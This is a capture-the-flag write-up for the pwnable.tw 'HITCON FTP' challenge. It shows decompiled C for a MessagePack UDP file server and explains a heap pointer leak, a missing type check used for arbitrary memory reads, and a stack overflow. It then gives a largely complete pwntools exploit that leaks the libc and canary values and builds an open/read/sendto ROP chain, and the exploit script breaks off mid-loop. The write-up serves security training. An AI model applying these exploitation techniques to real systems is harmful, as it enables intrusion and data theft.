---
title: HITCON FTP - pwnable.tw
tags:
  - binary exploit
  - pwnable.tw
createdAt: 2026-11-15
---

# Challenge Description

- Source challenge: [HITCON FTP](https://pwnable.tw/challenge/#44)

## File Type

```bash
$ file hitcon_ftp
hitcon_ftp: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.27.so, for GNU/Linux 3.2.0, BuildID[sha1]=89c97807f15db06fa4c45c8f91f0d50c0dee98d5, not stripped
```

## Binary Protection

```bash
$ checksec hitcon_ftp
[*] './hitcon_ftp'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

## Preview

- The binary uses MessagePack for serialization and deserialization
- Protocol of UDP socket connection:
  - Opcode 1 (RRQ) : `[1, filename, mode, {blksize: 512,...}]`
  - Opcode 2 (WRQ) : `[2, filename, mode, {blksize: 512,...}]` (Disabled, only write to file `/dev/null`)
  - Opcode 3 (DATA): `[3, block, crc, content]`
  - Opcode 4 (ACK) : `[4, block]`
  - Opcode 5 (ERR) : `[5, err_code, err_msg]`
  - Opcode 6 (OACK): `[6, {blksize: 512,...}]`

## Decompiled Code

- Glibc version [2.27](https://elixir.bootlin.com/glibc/glibc-2.27/source)
- [msgpack-c](https://github.com/msgpack/msgpack-c/tree/c_master)

```c
struct request_t {
	unsigned char opcode;
	char pad0[7];
	time_t expire_time;
	char filename[256];
	FILE* fp;
	unsigned short blksize;
	char pad1[2];
	unsigned int tsize;
	unsigned char timeout;
	char pad2;
	unsigned short block;
	unsigned int packet_len;
	struct sockaddr_in client_addr;
	socklen_t addr_len;
	unsigned int error_code;
	char error_msg[512];
};
...
unsigned __int64 init()
{
	setvbuf(stdout, 0, 2, 0);
	close(0);
	signal(14, (__sighandler_t)handler);
	alarm(60u);
	return sandbox();
}

void __fastcall add_oack_opt(const char *label, unsigned __int16 value)
{
	int i; // [rsp+1Ch] [rbp-4h]

	if ( opt_cnt <= 7 )
	{
		for ( i = 0; i < opt_cnt; ++i )
		{
			if ( !strcmp(oack_options[i].key, label) )
			{
				oack_options[i].value = value;
				return;
			}
		}
		strncpy(oack_options[opt_cnt].key, label, 0x3Fu);
		oack_options[opt_cnt++].value = value;
	}
}
...
int __fastcall process_new(struct request_t *request, unsigned int object_count, msgpack_object *objects)
{
	const char *read_mode; // rax
	int *errno_ptr; // rax
	char *errno_message; // rax
	const char *write_mode; // rax
	int request_opcode; // eax
	int *stat_errno_ptr; // rax
	char *stat_errno_message; // rax
	unsigned __int8 transfer_ok; // [rsp+23h] [rbp-10Dh]
	uint32_t option_index; // [rsp+24h] [rbp-10Ch]
	const char *mode; // [rsp+28h] [rbp-108h]
	union msgpack_object_union file_object; // [rsp+30h] [rbp-100h]
	union msgpack_object_union option_object; // [rsp+40h] [rbp-F0h]
	stat stat_buf; // [rsp+50h] [rbp-E0h] BYREF
	char option_name[64]; // [rsp+E0h] [rbp-50h] BYREF
	unsigned __int64 canary; // [rsp+128h] [rbp-8h]

	canary = __readfsqword(0x28u);
	transfer_ok = 0;
	*__errno_location() = 0;
	request->block = 0;
	request->blksize = 512;
	request->timeout = 3;
	request->expire_time = request->timeout + time(0);
	file_object = objects[1].via;
	if ( !file_object.str.size || file_object.str.size > 256 )
	{
		request->error_code = 0;
		strcpy(request->error_msg, "invalid filename");
		send_err(request);
		goto LABEL_61;
	}
	memset(request->filename, 0, sizeof(request->filename));
	strncpy(request->filename, file_object.str.ptr, file_object.str.size);
	if ( request->filename[0] == '/' )
	{
		request->error_code = 2;
		strcpy(request->error_msg, "absolute path forbidden");
		send_err(request);
		goto LABEL_61;
	}
	if ( strnstr(request->filename, "../", 256) )
	{
		request->error_code = 2;
		snprintf(request->error_msg, 0x200u, "file (%s) access violation", request->filename);
		send_err(request);
		goto LABEL_61;
	}
	mode = objects[2].via.str.ptr;
	if ( strncasecmp(mode, "netascii", 8u) && strncasecmp(mode, "octet", 5u) )
	{
		if ( !strncasecmp(mode, "mail", 4u) )
		{
			request->error_code = 0;
			strcpy(request->error_msg, "mail mode is not supported");
		}
		else
	{
			request->error_code = 0;
			strcpy(request->error_msg, "unknown mode");
		}
		send_err(request);
		goto LABEL_61;
	}
	option_object = objects[3].via;
	memset(oack_options, 0, sizeof(oack_options));
	opt_cnt = 0;
	if ( object_count > 3 )
	{
		for ( option_index = 0; option_object.map.size > option_index; ++option_index )
		{
			if ( option_object.map.ptr[option_index].key.type == MSGPACK_OBJECT_STR
				&& option_object.map.ptr[option_index].key.via.array.size <= 63
				&& option_object.map.ptr[option_index].val.type == MSGPACK_OBJECT_POSITIVE_INTEGER )
			{
				if ( !strncasecmp(option_object.map.ptr[option_index].key.via.str.ptr, "blksize", 7u) )
				{
					request->blksize = option_object.map.ptr[option_index].val.via.u64;
					if ( request->blksize <= 511u )
						request->blksize = 512;
					if ( request->blksize > 0xFFB8u )
						request->blksize = 65464;
					add_oack_opt("blksize", request->blksize);
				}
				else if ( !strncasecmp(option_object.map.ptr[option_index].key.via.str.ptr, "tsize", 5u) )
				{
					request->tsize = option_object.map.ptr[option_index].val.via.u64;
					add_oack_opt("tsize", request->tsize);
				}
				else if ( !strncasecmp(option_object.map.ptr[option_index].key.via.str.ptr, "timeout", 7u) )
				{
					request->timeout = option_object.map.ptr[option_index].val.via.u64;
					if ( !request->timeout )
						request->timeout = 1;
					add_oack_opt("timeout", request->timeout);
				}
				else
				{
					memset(option_name, 0, sizeof(option_name));
					strncpy(
						option_name,
						option_object.map.ptr[option_index].key.via.str.ptr,
						option_object.map.ptr[option_index].key.via.array.size);
					add_oack_opt(option_name, option_object.map.ptr[option_index].val.via.u64);
				}
			}
		}
	}
	if ( request->fp )
		fclose(request->fp);
	if ( request->opcode == 1 )
	{
		if ( !strncasecmp(mode, "octet", 5u) )
			read_mode = "rb";
		else
			read_mode = "rt";
		request->fp = fopen(request->filename, read_mode);
		if ( !request->fp || *__errno_location() )
		{
		LABEL_42:
			request->error_code = 1;
			strcpy(request->error_msg, "invalid path or no access");
			send_err(request);
			errno_ptr = __errno_location();
			errno_message = strerror(*errno_ptr);
			fprintf(stderr, "fopen failed. [%s]\n", errno_message);
			goto LABEL_61;
		}
	}
	else
	{
		fwrite("disable uploading\n", 1u, 0x12u, stderr);
		strcpy(request->filename, "/dev/null");
		if ( !strncasecmp(mode, "octet", 5u) )
			write_mode = "wb";
		else
			write_mode = "wt";
		request->fp = fopen(request->filename, write_mode);
		if ( !request->fp || *__errno_location() )
			goto LABEL_42;
	}
	setvbuf(request->fp, 0, 0, request->blksize);
	if ( opt_cnt )
	{
		if ( request->opcode == 1 )
		{
			if ( (unsigned int)stat(request->filename, &stat_buf) == -1 )
			{
				request->error_code = 2;
				strcpy(request->error_msg, "invalid path or no access");
				send_err(request);
				stat_errno_ptr = __errno_location();
				stat_errno_message = strerror(*stat_errno_ptr);
				fprintf(stderr, "fseek failed. [%s]\n", stat_errno_message);
				goto LABEL_61;
			}
			request->tsize = stat_buf.st_size;
			add_oack_opt("tsize", request->tsize);
		}
		send_oack(request);
		goto LABEL_60;
	}
	request_opcode = request->opcode;
	if ( request_opcode == 1 )
	{
		transfer_ok = process_send(request);
		goto LABEL_61;
	}
	if ( request_opcode != 2 || (unsigned int)send_ack(request) != -1 )
	LABEL_60:
		transfer_ok = 1;
LABEL_61:
	if ( transfer_ok != 1 )
		clean_req(request);
	return transfer_ok;
}

bool __fastcall check_crc32(char *output_buffer, uint64_t expected_crc, msgpack_object object)
{
	unsigned __int32 crc_state; // [rsp+20h] [rbp-18h]
	signed __int32 index; // [rsp+24h] [rbp-14h]

	msgpack_object_print_buffer(output_buffer, object.via.str.size + 1, object);
	crc_state = -1;
	for ( index = 1; index < strlen(output_buffer); ++index )
		crc_state = (crc_state >> 8) ^ crc32_tab[(unsigned __int8)(crc_state ^ output_buffer[index])];
	return expected_crc == ~crc_state;
}
...
int __fastcall main(int argc, const char **argv, const char **envp)
{
	int *socket_errno_ptr; // rax
	char *socket_errno_message; // rax
	uint16_t listen_port; // ax
	int *bind_errno_ptr; // rax
	char *bind_errno_message; // rax
	int *select_errno_ptr; // rax
	char *select_errno_message; // rax
	size_t unpacker_capacity; // rax
	size_t received_length; // r12
	struct datain_t *datain_buffer; // rbx
	char *unpacker_buffer; // rax
	struct request_t *active_request; // [rsp+20h] [rbp-480h]
	struct request_t *request_copy; // [rsp+28h] [rbp-478h]
	timeval select_timeout; // [rsp+30h] [rbp-470h] BYREF
	union msgpack_object_union root_array_meta; // [rsp+40h] [rbp-460h]
	msgpack_unpacked unpacked; // [rsp+50h] [rbp-450h] BYREF
	struct msgpack_unpacker unpacker; // [rsp+70h] [rbp-430h] BYREF
	struct sockaddr_in bind_address; // [rsp+B0h] [rbp-3F0h] BYREF
	fd_set socket_readfds; // [rsp+C0h] [rbp-3E0h] BYREF
	struct request_t incoming_request; // [rsp+140h] [rbp-360h] BYREF
	unsigned __int64 canary; // [rsp+488h] [rbp-18h]

	canary = __readfsqword(0x28u);
	sockfd = socket(2, 2, 17);
	if ( sockfd == -1 )
	{
		socket_errno_ptr = __errno_location();
		socket_errno_message = strerror(*socket_errno_ptr);
		fprintf(stderr, "socket failed. [%s]\n", socket_errno_message);
		exit(-1);
	}
	bind_address.sin_family = 2;
	bind_address.sin_addr.s_addr = inet_addr("0.0.0.0");
	if ( argc <= 1 )
		listen_port = 69;
	else
		listen_port = strtoul(argv[1], 0, 10);
	bind_address.sin_port = htons(listen_port);
	if ( bind(sockfd, (const struct sockaddr *)&bind_address, 0x10u) < 0 )
	{
		bind_errno_ptr = __errno_location();
		bind_errno_message = strerror(*bind_errno_ptr);
		fprintf(stderr, "bind failed. [%s]\n", bind_errno_message);
		exit(-1);
	}
	datain = (struct datain_t *)calloc(1u, 0xFFC5u);
	if ( !datain )
	{
		fwrite("out of memory\n", 1u, 0xEu, stderr);
		exit(-1);
	}
	while ( 1 )
	{
		select_timeout.tv_sec = 1;
		select_timeout.tv_usec = 0;
		memset(&socket_readfds, 0, sizeof(socket_readfds));
		socket_readfds.fds_bits[sockfd / 64] |= 1LL << (sockfd % 64);
		if ( select(sockfd + 1, &socket_readfds, 0, 0, &select_timeout) == -1 )
			break;
		if ( (socket_readfds.fds_bits[sockfd / 64] & (1LL << (sockfd % 64))) != 0 )
		{
			memset(&incoming_request, 0, sizeof(incoming_request));
			incoming_request.addr_len = 16;
			*__errno_location() = 0;
			incoming_request.packet_len = recvfrom(
				sockfd,
				datain,
				0xFFC5u,
				0,
				(struct sockaddr *)&incoming_request.client_addr,
				&incoming_request.addr_len);
			if ( incoming_request.packet_len <= 2 || *__errno_location() )
			{
				puts("illegal packet");
			}
			else
			{
				msgpack_unpacker_init(&unpacker, 0xFFC5u);
				unpacker_capacity = msgpack_unpacker_buffer_capacity(&unpacker);
				if ( unpacker_capacity < (int)incoming_request.packet_len
					&& (unsigned __int8)msgpack_unpacker_reserve_buffer(&unpacker, (int)incoming_request.packet_len) )
				{
					fwrite("out of memory\n", 1u, 0xEu, stderr);
					exit(-1);
				}
				received_length = (int)incoming_request.packet_len;
				datain_buffer = datain;
				unpacker_buffer = (char *)msgpack_unpacker_buffer(&unpacker);
				memcpy(unpacker_buffer, datain_buffer, received_length);
				msgpack_unpacker_buffer_consumed(&unpacker, (int)incoming_request.packet_len);
				msgpack_unpacked_init(&unpacked);
				if ( (unsigned int)msgpack_unpacker_next(&unpacker, &unpacked) != 2 )
				{
					puts("parse packet failed");
					goto LABEL_94;
				}
				if ( unpacked.data.type != MSGPACK_OBJECT_ARRAY
					|| unpacked.data.via.array.size <= 1
					|| unpacked.data.via.array.ptr[0].type != MSGPACK_OBJECT_POSITIVE_INTEGER )
				{
				LABEL_39:
					incoming_request.error_code = 4;
					strcpy(incoming_request.error_msg, "illegal packet");
					send_err(&incoming_request);
					goto LABEL_94;
				}
				root_array_meta = unpacked.data.via;
				incoming_request.opcode = unpacked.data.via.array.ptr[0].via.u64;
				active_request = find_request(*(struct sa_family_t **)&incoming_request.client_addr.sin_family);
				if ( active_request )
				{
					if ( incoming_request.opcode == 3 || (int)incoming_request.packet_len <= 512 )
					{
						switch ( incoming_request.opcode )
						{
							case 1u:
							case 2u:
								if ( root_array_meta.array.size <= 2
									|| root_array_meta.array.ptr[0].type != MSGPACK_OBJECT_POSITIVE_INTEGER
									|| root_array_meta.array.ptr[1].type != MSGPACK_OBJECT_STR
									|| root_array_meta.array.ptr[2].type != MSGPACK_OBJECT_STR
									|| root_array_meta.array.size == 4 && root_array_meta.array.ptr[3].type != MSGPACK_OBJECT_MAP )
								{
									goto LABEL_62;
								}
								active_request->opcode = incoming_request.opcode;
								process_new(active_request, root_array_meta.array.size, root_array_meta.array.ptr);
								break;
							case 3u:
								if ( active_request->opcode == 2 )
								{
									if ( root_array_meta.array.size != 4
										|| root_array_meta.array.ptr[0].type != MSGPACK_OBJECT_POSITIVE_INTEGER
										|| root_array_meta.array.ptr[1].type != MSGPACK_OBJECT_POSITIVE_INTEGER
										|| root_array_meta.array.ptr[2].type != MSGPACK_OBJECT_POSITIVE_INTEGER
										|| root_array_meta.array.ptr[3].type != MSGPACK_OBJECT_BIN
										&& root_array_meta.array.ptr[3].type != MSGPACK_OBJECT_STR )
									{
										goto LABEL_62;
									}
									incoming_request.block = root_array_meta.array.ptr[1].via.u64;
									if ( (int)incoming_request.packet_len <= (unsigned __int64)active_request->blksize + 13 )
									{
										if ( !check_crc32(
											(char *)&incoming_request.error_code,
											root_array_meta.array.ptr[2].via.u64,
											root_array_meta.array.ptr[3]) )
										{
											active_request->error_code = 4;
											strcpy(active_request->error_msg, "crc32 check failed");
											send_err(active_request);
											clean_req(active_request);
										}
										else if ( incoming_request.block == active_request->block + 1
											&& (unsigned __int8)process_recv(
												active_request,
												root_array_meta.array.ptr[3].via.array.size,
												root_array_meta.array.ptr[3].via.array.ptr) != 1 )
										{
											puts("process recving failed");
										}
									}
									else
									{
										active_request->error_code = 4;
										strcpy(active_request->error_msg, "illegal packet");
										send_err(active_request);
										puts("incoming packet too large");
										clean_req(active_request);
									}
								}
								break;
							case 4u:
								if ( active_request->opcode == 1 )
								{
									if ( root_array_meta.array.size != 2
										|| root_array_meta.array.ptr[0].type != MSGPACK_OBJECT_POSITIVE_INTEGER
										|| root_array_meta.array.ptr[1].type != MSGPACK_OBJECT_POSITIVE_INTEGER )
									{
										goto LABEL_62;
									}
									incoming_request.block = root_array_meta.array.ptr[1].via.u64;
									if ( incoming_request.block == active_request->block )
									{
										active_request->packet_len = incoming_request.packet_len;
										if ( (unsigned __int8)process_send(active_request) != 1 )
											puts("process sending failed");
									}
								}
								break;
							case 5u:
								if ( root_array_meta.array.size == 3
									&& root_array_meta.array.ptr[0].type == MSGPACK_OBJECT_POSITIVE_INTEGER
									&& root_array_meta.array.ptr[1].type == MSGPACK_OBJECT_POSITIVE_INTEGER
									&& root_array_meta.array.ptr[2].type == MSGPACK_OBJECT_STR )
								{
									active_request->error_code = root_array_meta.array.ptr[1].via.u64;
									memset(active_request->error_msg, 0, sizeof(active_request->error_msg));
									strncpy(
										active_request->error_msg,
										root_array_meta.array.ptr[2].via.str.ptr,
										root_array_meta.array.ptr[2].via.array.size);
									printf("error %i at client, %s\n", active_request->error_code, active_request->error_msg);
									clean_req(active_request);
								}
								else
								{
								LABEL_62:
									active_request->error_code = 4;
									strcpy(active_request->error_msg, "illegal packet");
									send_err(active_request);
								}
								break;
							default:
								active_request->error_code = 4;
								strcpy(active_request->error_msg, "illegal packet");
								send_err(active_request);
								printf("unexpected opcode %u\n", incoming_request.opcode);
								clean_req(active_request);
								break;
						}
					}
					else
					{
						active_request->error_code = 4;
						strcpy(active_request->error_msg, "illegal packet");
						send_err(active_request);
						puts("incoming packet too large");
					}
				}
				else
				{
					if ( (int)incoming_request.packet_len > 512 )
					{
						incoming_request.error_code = 4;
						strcpy(incoming_request.error_msg, "illegal packet");
						send_err(&incoming_request);
						puts("incoming packet too large");
						goto LABEL_94;
					}
					if ( !incoming_request.opcode )
					{
					LABEL_50:
						incoming_request.error_code = 5;
						strcpy(incoming_request.error_msg, "unknown transfer id");
						send_err(&incoming_request);
						puts(incoming_request.error_msg);
						goto LABEL_94;
					}
					if ( incoming_request.opcode <= 2u )
					{
						if ( root_array_meta.array.size <= 2
							|| root_array_meta.array.ptr[0].type != MSGPACK_OBJECT_POSITIVE_INTEGER
							|| root_array_meta.array.ptr[1].type != MSGPACK_OBJECT_STR
							|| root_array_meta.array.ptr[2].type != MSGPACK_OBJECT_STR
							|| root_array_meta.array.size == 4 && root_array_meta.array.ptr[3].type != MSGPACK_OBJECT_MAP )
						{
							goto LABEL_39;
						}
						if ( (unsigned __int8)process_new(
							&incoming_request,
							unpacked.data.via.array.size,
							unpacked.data.via.array.ptr) )
						{
							request_copy = (struct request_t *)calloc(1u, 0x340u);
							if ( !request_copy )
							{
								fwrite("out of memory\n", 1u, 0xEu, stderr);
								exit(-1);
							}
							memcpy(request_copy, &incoming_request, sizeof(struct request_t));
							add_request(request_copy);
						}
					}
					else
					{
						if ( incoming_request.opcode != 5 )
							goto LABEL_50;
						if ( root_array_meta.array.size != 3
							|| root_array_meta.array.ptr[0].type != MSGPACK_OBJECT_POSITIVE_INTEGER
							|| root_array_meta.array.ptr[1].type != MSGPACK_OBJECT_POSITIVE_INTEGER
							|| root_array_meta.array.ptr[2].type != MSGPACK_OBJECT_STR )
						{
							goto LABEL_39;
						}
						incoming_request.error_code = root_array_meta.array.ptr[1].via.u64;
						strncpy(
							incoming_request.error_msg,
							root_array_meta.array.ptr[2].via.str.ptr,
							root_array_meta.array.ptr[2].via.array.size);
						printf("error %i at client, %s\n", incoming_request.error_code, incoming_request.error_msg);
					}
				}
			LABEL_94:
				msgpack_unpacker_destroy(&unpacker);
				msgpack_unpacked_destroy(&unpacked);
			}
		}
	}
	select_errno_ptr = __errno_location();
	select_errno_message = strerror(*select_errno_ptr);
	fprintf(stderr, "select failed. [%s]\n", select_errno_message);
	return -1;
}
```

# Vulnerability

## File pointer leak

- In `process_new()` function, when validating a file, it only checks whether the filename's size is zero or greater than 256 before copying to `request->filename`:

```c
file_object = objects[1].via;
if ( !file_object.str.size || file_object.str.size > 256 )
{
	request->error_code = 0;
	strcpy(request->error_msg, "invalid filename");
	send_err(request);
	goto LABEL_61;
}
memset(request->filename, 0, sizeof(request->filename));
strncpy(request->filename, file_object.str.ptr, file_object.str.size);
```

- If the size of the filename is equal to 256 bytes, there won't be a NULL character between the `filename` and `fp` fields which may leak the **file pointer** (heap pointer).

## Missing MessagePack type check

- In `main()`, when handling opcode 1 and 2, if the request contains 5 array elements, the program will skip validating `array[3]`. Therefore, with 5 elements, raw BIN data can be interpreted as `msgpack_object_kv` entries.

```c
case 1u:
case 2u:
	if ( root_array_meta.array.size <= 2
		|| root_array_meta.array.ptr[0].type != MSGPACK_OBJECT_POSITIVE_INTEGER
		|| root_array_meta.array.ptr[1].type != MSGPACK_OBJECT_STR
		|| root_array_meta.array.ptr[2].type != MSGPACK_OBJECT_STR
		|| root_array_meta.array.size == 4 && root_array_meta.array.ptr[3].type != MSGPACK_OBJECT_MAP )
	{
		goto LABEL_62;
	}
	active_request->opcode = incoming_request.opcode;
	process_new(active_request, root_array_meta.array.size, root_array_meta.array.ptr);
	break;
```

## Buffer Overflow

- When handling the opcode 3 in `main()` function, the program calls `check_crc32()` with a pointer to `incoming_request.error_code`.

```c
case 3u:
	...
			if ( !check_crc32(
				(char *)&incoming_request.error_code,
				root_array_meta.array.ptr[2].via.u64,
				root_array_meta.array.ptr[3]) )
			{
				active_request->error_code = 4;
				strcpy(active_request->error_msg, "crc32 check failed");
				send_err(active_request);
				clean_req(active_request);
			}
	...
	break;
```

- Inside `check_crc32()`, it calls `msgpack_object_print_buffer()` to render the controlled request's payload into that stack buffer using the size taken from that request.

```c
bool __fastcall check_crc32(char *output_buffer, uint64_t expected_crc, msgpack_object object)
{
	unsigned __int32 crc_state; // [rsp+20h] [rbp-18h]
	signed __int32 index; // [rsp+24h] [rbp-14h]

	msgpack_object_print_buffer(output_buffer, object.via.str.size + 1, object);
	crc_state = -1;
	for ( index = 1; index < strlen(output_buffer); ++index )
		crc_state = (crc_state >> 8) ^ crc32_tab[(unsigned __int8)(crc_state ^ output_buffer[index])];
	return expected_crc == ~crc_state;
}
```

- Therefore, this vulnerability can be used to trigger a **Buffer Overflow**.

# Exploitation

## Leak Heap Address

- The length of the `filename` field in `request_t` is exactly 256 bytes, and the field after it is the **file pointer**:

```c
struct request_t {
	// ...
	char filename[256];
	FILE *fp;
	// ...
};
```

- On the traversal error path, the program uses `"%s"` to include the filename in the error message.

```c
if ( strnstr(request->filename, "../", 256) )
{
	request->error_code = 2;
	snprintf(request->error_msg, 0x200u, "file (%s) access violation", request->filename);
	send_err(request);
	goto LABEL_61;
}
```

- If there is no NULL character between `filename` and `fp` field, the `"%s"` format specifier will read both the `filename` and `fp` fields, leaking the heap pointer. Therefore, I first send a WRQ request to the program, so that it creates an initial `fp` for `/dev/null`. Then I just need to send another RRQ/WRQ request that triggers the traversal error path, and receive the error message containing the heap pointer.

```python
sock.wrq("upload", "octet")
sock.recv()
payload = b"../".ljust(0x100, b"A")
sock.rrq(payload.decode(), "netascii")
resp = sock.recv()
error_msg: bytes = resp[2]
dev_null_fp = u64(
    error_msg[len(b"file (" + payload) : error_msg.find(b") access violation")].ljust(
        8, b"\x00"
    )
)
heap_base = dev_null_fp - 0x22AD0
success(f"Leak heap base: {hex(heap_base)}")
```

## Leak Libc, Stack Address and Canary Value

- In the `process_new` function, when handling an option from a request, the program copies from `key.via.str.ptr` into `option_name`.

```c
memset(option_name, 0, sizeof(option_name));
strncpy(
	option_name,
	option_object.map.ptr[option_index].key.via.str.ptr,
	option_object.map.ptr[option_index].key.via.array.size);
add_oack_opt(option_name, option_object.map.ptr[option_index].val.via.u64);
```

- After that, if `opt_cnt` is greater than 0, it sends back to the client an OACK response containing a map of all options.

```c
if ( opt_cnt )
{
	if ( request->opcode == 1 )
	{
		if ( (unsigned int)stat(request->filename, &stat_buf) == -1 )
		{
			request->error_code = 2;
			strcpy(request->error_msg, "invalid path or no access");
			send_err(request);
			stat_errno_ptr = __errno_location();
			stat_errno_message = strerror(*stat_errno_ptr);
			fprintf(stderr, "fseek failed. [%s]\n", stat_errno_message);
			goto LABEL_61;
		}
		request->tsize = stat_buf.st_size;
		add_oack_opt("tsize", request->tsize);
	}
	send_oack(request);
	goto LABEL_60;
}
```

- Therefore, using the second vulnerability, I send a request with 5+ elements, where the third element is raw BIN data. This data contains an arbitrary memory address. After the above processing, the program will send the value in that memory address through the map's key. By combining that with the previously leaked heap pointer, I obtain the libc address, stack address and canary value of the `main` function.

```python
class UDPSocket:
    # ...
    def leak_memory(self, address: int):
        payload = p64(5) + p64(63) + p64(address) + p64(2) + p64(1)
        packet = [2, "upload", "octet", payload, "dummy"]
        self.send(packet)
        resp = self.recv()
        oack_options: dict[bytes, int] = resp[1]
        return u64(list(oack_options.keys())[0].ljust(8, b"\x00"))

# ...
heap_base = dev_null_fp - 0x22AD0
success(f"Leak heap base: {hex(heap_base)}")

large_bin = sock.leak_memory(heap_base + 0x22D00)
libc.address = large_bin - 0x3EC2C0
success(f"Leak libc address: {hex(libc.address)}")

environ = sock.leak_memory(libc.symbols["__environ"])
main_canary_addr = environ - 0x118
success(f"Leak main canary address: {hex(main_canary_addr)}")

main_canary = sock.leak_memory(main_canary_addr + 1) << 8
success(f"Leak main canary: {hex(main_canary)}")
```

## Build ROP Chain

- Based on the third vulnerability and the leaked canary value of the `main` function, I build a ROP chain and let the `main` function return to trigger it. However, there are several problems:
  - I cannot send BIN data which is parsed and formatted in the `msgpack_object_print_buffer` function, but ROP chain needs raw binary characters.
  - The program runs in a sandbox which doesn't allow the `execve` syscall.

- To solve the first problem, when creating a DATA request, I still use the `msgpack` library to craft the packet; but then, I modify 1 byte in that packet which changes the data type from BIN to STR. So, when the program receives and unpacks the packet, it will treat that modified object as STR rather than BIN, and `msgpack_object_print_buffer` will print all the raw characters to the target output.

```python
class UDPSocket:
    # ...
    def data(self, block: int, content: bytes):
        crc = zlib.crc32(content[:-1]) & 0xFFFFFFFF
        # info(f"CRC32: {hex(crc)}")
        packet = [3, block, crc, content]
        raw_array = bytearray(msgpack.packb(packet, use_bin_type=True))
        raw_array[8] = 0xDA
        raw = bytes(raw_array)
        # debug(f"Sending raw: [{' '.join(f'0x{b:02x}' for b in raw)}]")
        self.sock.sendto(raw, (self.host, self.port))
    # ...
```

- For the second problem, my goal is to read the file at `/home/hitcon_ftp/flag`, so I just need to craft a ROP chain using those syscalls to do it: `open`, `read`, `sendto`
- Finally, I wait 61 seconds for the `main` function to receive SIGALRM and return into the ROP chain, obtaining the flag.

## Exploit Code

```python
#!/usr/bin/env python
from typing import Any
import zlib

from pwn import *
import msgpack

TARGET = "./bin/hitcon_ftp"
LIBC = "./lib/libc.so.6"

exe = ELF(TARGET)
libc = ELF(LIBC, checksec=False) if os.path.exists(LIBC) else None

context.terminal = [
    "kitty",
    "@",
    "launch",
    "--type=os-window",
    "--cwd=current",
    "sh",
    "-c",
]
context.log_level = "debug"
context.arch = "amd64"
context.binary = exe

gdbscript = """
handle SIGALRM pass
add-symbol-file types.o
di connect
di sync
brva 0x402a
c
"""


def conn(command: list[str] | None = None) -> remote | process:
    if command is None:
        command = [TARGET]
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10309)
    elif args.LOCAL:
        return process(command)
    else:
        return gdb.debug(command, gdbscript, env={"SHELL": "/bin/sh"})


class UDPSocket:
    def __init__(self, host: str, port: int):
        self.host: str = host
        self.port: int = port
        self.sock: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def send(self, data: list[Any]):
        debug(f"Sending: {data}")
        raw = msgpack.packb(data, use_bin_type=True)
        # debug(f"Sending raw: [{' '.join(f'0x{b:02x}' for b in raw)}]")
        self.sock.sendto(raw, (self.host, self.port))

    def recv_raw(self, bufsize: int = 4096):
        raw, _ = self.sock.recvfrom(bufsize)
        return raw

    def recv(self, bufsize: int = 4096):
        raw, _ = self.sock.recvfrom(bufsize)
        return msgpack.unpackb(raw, raw=True)

    def rrq(self, filename: str, mode: str, **options):
        packet = [1, filename, mode, options or {}]
        info(packet)
        self.send(packet)

    def wrq(self, filename: str, mode: str, **options):
        packet = [2, filename, mode, options or {}]
        self.send(packet)

    @staticmethod
    def _render_data_for_crc(content: bytes) -> bytes:
        rendered = bytearray()
        for byte in content:
            if 0x20 <= byte <= 0x7E and byte != ord('"'):
                rendered.append(byte)
            elif byte == ord('"'):
                rendered += b'\\"'
            else:
                rendered += f"\\x{byte:02x}".encode()
        return bytes(rendered)

    def data(self, block: int, content: bytes):
        crc = zlib.crc32(content[:-1]) & 0xFFFFFFFF
        # info(f"CRC32: {hex(crc)}")
        packet = [3, block, crc, content]
        raw_array = bytearray(msgpack.packb(packet, use_bin_type=True))
        raw_array[8] = 0xDA
        raw = bytes(raw_array)
        # debug(f"Sending raw: [{' '.join(f'0x{b:02x}' for b in raw)}]")
        self.sock.sendto(raw, (self.host, self.port))

    def leak_memory(self, address: int):
        payload = p64(5) + p64(63) + p64(address) + p64(2) + p64(1)
        packet = [2, "upload", "octet", payload, "dummy"]
        self.send(packet)
        resp = self.recv()
        oack_options: dict[bytes, int] = resp[1]
        return u64(list(oack_options.keys())[0].ljust(8, b"\x00"))


if args.REMOTE:
    target = conn()
    target.recvuntil(b": ")
    host = "chall.pwnable.tw"
    port = int(target.recvuntil(b"\n", drop=True).decode())
    target.close()
else:
    host = "localhost"
    port = 5000
    target = conn([TARGET, str(port)])

pause()
sock = UDPSocket(host, port)
sock.wrq("upload", "octet")
sock.recv()
payload = b"../".ljust(0x100, b"A")
sock.rrq(payload.decode(), "netascii")
resp = sock.recv()
error_msg: bytes = resp[2]
dev_null_fp = u64(
    error_msg[len(b"file (" + payload) : error_msg.find(b") access violation")].ljust(
        8, b"\x00"
    )
)
heap_base = dev_null_fp - 0x22AD0
success(f"Leak heap base: {hex(heap_base)}")

large_bin = sock.leak_memory(heap_base + 0x22D00)
libc.address = large_bin - 0x3EC2C0
success(f"Leak libc address: {hex(libc.address)}")

environ = sock.leak_memory(libc.symbols["__environ"])
main_canary_addr = environ - 0x118
success(f"Leak main canary address: {hex(main_canary_addr)}")

main_canary = sock.leak_memory(main_canary_addr + 1) << 8
success(f"Leak main canary: {hex(main_canary)}")


pop_rdi = libc.address + 0x2155F
pop_rsi = libc.address + 0x23E6A
pop_rdx_rsi = libc.address + 0x1306D9
pop_rcx = libc.address + 0x3EB0B
pop_r8_mov_eax_1 = libc.address + 0x155FC6
client_addr = heap_base + 0x23E38
file_flag_addr = main_canary_addr - 21
flag_addr = heap_base
flag_len = 100
layout = [
    p64(main_canary),
    b"C" * (8 * 3 - 1) + b"\x00",
    p64(pop_rdi),
    p64(file_flag_addr),
    p64(pop_rdx_rsi),
    p64(0),
    p64(0),
    p64(libc.symbols["open"]),
    p64(pop_rdi),
    p64(3),
    p64(pop_rdx_rsi),
    p64(flag_len),
    p64(flag_addr),
    p64(libc.symbols["read"]),
    p64(pop_rdi),
    p64(0),
    p64(pop_rdx_rsi),
    p64(flag_len),
    p64(flag_addr),
    p64(pop_rcx),
    p64(0),
    p64(pop_r8_mov_eax_1),
    p64(client_addr),
    p64(libc.symbols["sendto"]),
]

total_layout = sum([len(chunk) for chunk in layout])
info(f"Total layout length: {total_layout}")

common_payload = b"\xff" * 7 + b"B" * 4 + b"/home/hitcon_ftp/flag".rjust(512, b"A")
dynamic_payload = b"D" * total_layout

temp_layout = []
for chunk in layout:
    temp_byte = b""
